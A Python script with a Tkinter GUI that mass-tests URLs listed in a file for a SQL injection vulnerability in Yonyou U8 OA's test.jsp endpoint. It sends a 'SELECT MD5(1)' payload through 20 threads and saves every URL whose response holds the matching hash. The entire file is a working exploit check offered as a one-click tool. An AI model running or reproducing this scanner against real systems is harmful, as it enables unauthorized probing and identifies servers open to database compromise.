import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def yyu8_testsql_exp(url):
    poc = r"""/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))"""
    url = url + poc
    try:
        res = requests.get(url, timeout=3)
        if "c4ca4238a0b923820dcc509a6f75849b" in res.text:
            yyu8_testsql_text.insert(END,"【!!!!!!】存在漏洞的url：" + url + "\n")
            yyu8_testsql_text.see(END)
            with open ("存在用友U8OAtest_jspSQL注入漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            yyu8_testsql_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            yyu8_testsql_text.see(END)
    except Exception as err:
        yyu8_testsql_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        yyu8_testsql_text.see(END)
def get_yyu8_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def yyu8_testsql_gui():
    yyu8_testsql = tk.Tk()
    yyu8_testsql.geometry("910x450")
    yyu8_testsql.title("用友 U8 OA test.jsp SQL注入漏洞一把梭")
    yyu8_testsql.resizable(0, 0)
    yyu8_testsql.iconbitmap('logo.ico')
    global yyu8_testsql_text
    yyu8_testsql_text = scrolledtext.ScrolledText(yyu8_testsql,width=123, height=25)
    yyu8_testsql_text.grid(row=0, column=0, padx=10, pady=10)
    yyu8_testsql_text.see(END)
    addrs = get_yyu8_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(yyu8_testsql_exp, addr)
    yyu8_testsql.mainloop()